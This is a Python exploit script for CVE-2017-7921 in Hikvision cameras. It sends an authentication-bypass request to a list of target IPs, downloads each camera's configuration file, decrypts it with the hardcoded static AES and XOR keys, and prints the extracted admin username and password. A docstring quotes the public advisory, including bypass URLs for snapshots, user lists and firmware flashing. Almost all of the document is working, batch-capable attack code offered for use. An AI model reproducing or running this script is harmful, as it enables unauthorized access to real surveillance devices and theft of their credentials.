# /usr/bin/python3

from io import BytesIO
from itertools import cycle
from Crypto.Cipher import AES
import requests
from operator import itemgetter
from pathlib import Path
import base64
import re
import fire
import os
import sys


# 补足字符串长度为16的倍数
def add_to_16(s):
    while len(s) % 16 != 0:
        s += b'\0'
    return s  # 返回bytes


def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
    key = bytes.fromhex(hex_key)
    ciphertext = add_to_16(ciphertext)
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_ECB, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")


def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))


def strings(file):
    chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
    shortestReturnChar = 2
    regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
    pattern = re.compile(regExp)
    return pattern.findall(file)


def enmuration(list, keyword='admin'):
    return [i for i, e in enumerate(list) if e == keyword]


def vaild_target(target):
    regex = re.compile(
        r"(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$|(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9]+$")
    result = re.search(regex, target)
    if result:
        return result[0]
    else:
        return None


def param_to_list(param, method=""):
    list = set()
    path = Path(param)
    if path.exists() and path.is_file():
        with open(path, encoding='utf-8', errors='ignore') as file:
            for line in file:
                line = vaild_target(line.strip())
                list.add(line)
        return list
    else:
        list = param.split(',')
        return list


def exploit(targetList):
    for target in targetList:
        try:
            r = requests.get(
                "http://%s/System/configurationFile?auth=YWRtaW46MTEK" % target, timeout=5, verify=False)
            if r.status_code == 200:
                # print("Maybe Have Vuln.")
                with BytesIO(decrypt(r.content)) as f:
                    xor = xore(f.read())
                result_list = strings(xor.decode('ISO-8859-1'))
                _index = enmuration(result_list)
                result = target + ',' + \
                         result_list[_index[-1]] + ',' + result_list[_index[-1] + 1]
                print(result)
            else:
                result = target + ',failed'
                print(result)
        except requests.exceptions.ConnectionError:
            pass


class CVE_2017_7921_EXP(object):
    """
    CVE_2017_7921_EXP

    Example:
        python3 CVE_2017_7921_EXP.py -t 127.0.0.1 run
        python3 CVE_2017_7921_EXP.py -t ./target.txt run

    :param str target:      ip:port or file example:127.0.0.1 or ./targets.txt

    An Improper Authentication issue was discovered in Hikvision  devices.
    The improper authentication vulnerability occurs when an application does not adequately or correctly authenticate users.
    This may allow a malicious user to escalate his or her privileges on the system and gain access to sensitive information.

    https://seclists.org/fulldisclosure/2017/Sep/23

    Vulnerability details:
    ----------------------
    Hikvision camera API includes support for proprietary HikCGI protocol, which exposes URI endpoints through the camera's
    web interface. The HikCGI protocol handler checks for the presence of a parameter named "auth" in the query string and
    if that parameter contains a base64-encoded "username:password" string, the HikCGI API call assumes the idntity of the
    specified user. The password is ignored.

    Virtually all Hikvision products come with a superuser account named "admin", which can be easily impersonated.  For
    example:

    Retrieve a list of all users and their roles:
        http://camera.ip/Security/users?auth=YWRtaW46MTEK

    Obtain a camera snapshot without authentication:
        http://camera.ip/onvif-http/snapshot?auth=YWRtaW46MTEK


    All other HikCGI calls can be impersonated in the same way, including those that add new users or flash camera
    firmware. Because most Hikvision devices only protect firmware images by obfuscation, one can flash arbitrary code  or
    render hundreds of thousands of connected devices permanently unusable with just one simple http call.

    And worst of all, one can download camera configuration:
        http://camera.ip/System/configurationFile?auth=YWRtaW46MTEK

    Configuration backup files, unfortunately, contain usernames and plain-text passwords for all configured users. While
    the files are encrypted, the encryption is easily reversible, because Hikvision chose to use a static encryption key,
    which is derived from the password "abcdefg". Other Hikvision products have similarly weak encryption mechanisms.

    """

    def __init__(self, target):
        self.targetList = param_to_list(target)

    def run(self):
        print("There are %s targets" % len(self.targetList))
        if len(self.targetList) > 0:
            exploit(self.targetList)
        print("Finished")


if __name__ == '__main__':
    fire.Fire(CVE_2017_7921_EXP)
